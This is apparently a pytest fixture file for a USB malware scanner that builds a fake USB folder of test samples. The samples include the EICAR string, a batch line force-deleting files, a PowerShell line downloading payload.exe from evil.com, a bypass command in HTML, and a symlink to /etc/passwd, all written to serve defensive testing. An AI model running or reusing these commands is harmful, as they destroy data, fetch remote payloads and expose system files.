"""
conftest.py — pytest fixtures for USB-Defender tests.
"""

import os
import sys
import tempfile
import shutil
import pytest

# Ensure app/ is importable
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))


@pytest.fixture(autouse=True)
def fresh_db(tmp_path, monkeypatch):
    """
    Redirect DB_FILE and LOG_DIR to temp paths so tests don't pollute
    the real database. Runs init_db() automatically.
    """
    import db as db_module

    test_db = tmp_path / "test.db"
    test_log_dir = tmp_path / "logs"
    test_log_dir.mkdir()

    monkeypatch.setattr(db_module, "DB_FILE", test_db)
    monkeypatch.setattr(db_module, "LOG_DIR", test_log_dir)
    monkeypatch.setattr(db_module, "LOG_FILE", test_log_dir / "activity.log")

    # Also patch logger's references
    import logger as logger_module
    monkeypatch.setattr(logger_module, "log_event", logger_module.log_event)

    db_module.init_db()
    yield tmp_path


@pytest.fixture
def test_usb(tmp_path):
    """Create a fake USB directory with test files."""
    usb = tmp_path / "fake_usb"
    usb.mkdir()

    # Clean file
    (usb / "readme.txt").write_text("Hello, this is a clean readme.")

    # EICAR test file (exact standard string)
    eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
    (usb / "eicar.com").write_text(eicar)

    # HTML injection
    (usb / "evil.html").write_text("<html><script>powershell -exec bypass</script></html>")

    # Batch file
    (usb / "destroy.bat").write_text("@echo off\ndel /f /q C:\\important\\*")

    # PowerShell dropper
    (usb / "dropper.ps1").write_text("Invoke-WebRequest -Uri http://evil.com/payload.exe -OutFile C:\\temp\\payload.exe")

    # Large file (> 5MB, should skip heuristic but still hash)
    large_file = usb / "large.bin"
    large_file.write_bytes(b"\x00" * (6 * 1024 * 1024))

    # Symlink
    try:
        (usb / "symlink.txt").symlink_to("/etc/passwd")
    except OSError:
        pass  # Windows or permission issue

    return usb
